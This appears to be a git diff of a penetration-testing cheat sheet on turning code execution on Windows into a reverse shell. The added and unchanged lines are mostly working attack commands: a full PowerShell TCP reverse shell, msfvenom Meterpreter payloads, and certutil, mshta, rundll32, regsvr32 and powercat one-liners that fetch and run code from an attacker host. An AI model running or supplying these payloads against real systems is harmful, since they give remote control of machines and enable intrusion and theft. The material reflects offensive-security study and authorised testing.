@@ -1,12 +1,35 @@
-# Windows code exec to shell
+# Create reverse shell from code execution on Windows machine
 
-### Windows one-liners
+First, you create reverse shell executable with msfvenom.
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o rev.exe
+```
+
+Then you'll host your executable with some http server (in this example I'll use python's http.server).
+
+```
+sudo python3 -m http.server 80
+```
+
+Now you can setup your listener (multi/handler or normal netcat listener).
+
+And lastly from target Windows machine you'll execute certutil.
+
+```
+cmd.exe /C certutil -urlcache -split -f http://<LHOST>/rev.exe rev.exe
+```
+
+For more: https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
+
+
+## Windows one-liners
 
 ```text
 https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
 ```
 
-### powershell.exe
+## powershell.exe
 
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
@@ -24,13 +47,13 @@ python3 -m http.server <port>
 powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<LPORT>/shell.ps1\");"
 ```
 
-#### Creating encoded powershell commands on linux
+### Creating encoded powershell commands on linux
 
 ```text
 echo -n "IEX (New-Object Net.WebClient).downloadstring('<thing_to_execute>')" | iconv --to-code UTF-16LE | base64 -w 0
 ```
 
-### mshta.exe
+## mshta.exe
 
 Runs .hta \(HTML Application\) files
 
@@ -51,7 +74,7 @@ use exploit/windows/misc/hta_server
 mshta.exe http://<attacker>/<path>.hta
 ```
 
-### rundll32.exe
+## rundll32.exe
 
 ```text
 # first, we generate dll file with msfvenom
@@ -70,7 +93,7 @@ use exploit/windows/smb/smb_delivery
 rundll32.exe \\<attacker>\<path>\<file>.dll,0
 ```
 
-### regsrv32.exe
+## regsrv32.exe
 
 ```text
 use exploit/multi/script/web_delivery
@@ -78,7 +101,7 @@ use exploit/multi/script/web_delivery
 regsvr32 /s /n /u /i:http://<attacker>:<p>/<file>.sct scrobj.dll
 ```
 
-### certutil.exe
+## certutil.exe
 
 ```text
 msfvenom -p windows/meterpreter/reverse_tcp lhost=<lhost> lport=<lport> -f exe > shell.exe
@@ -91,7 +114,7 @@ python3 -m http.server 80
 certutil.exe -urlcache -split -f http://<target>/shell.exe shell.exe & shell.exe
 ```
 
-### powershell.exe \(with powercat\)
+## powershell.exe \(with powercat\)
 
 ```text
 git clone https://github.com/besimorhino/powercat.git
@@ -100,7 +123,7 @@ python -m SimpleHTTPServer 80
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<attacker>/powercat.ps1');powercat -c <attacker> -p <port> -e cmd"
 ```
 
-### more ...
+## more ...
 
 ```text
 https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
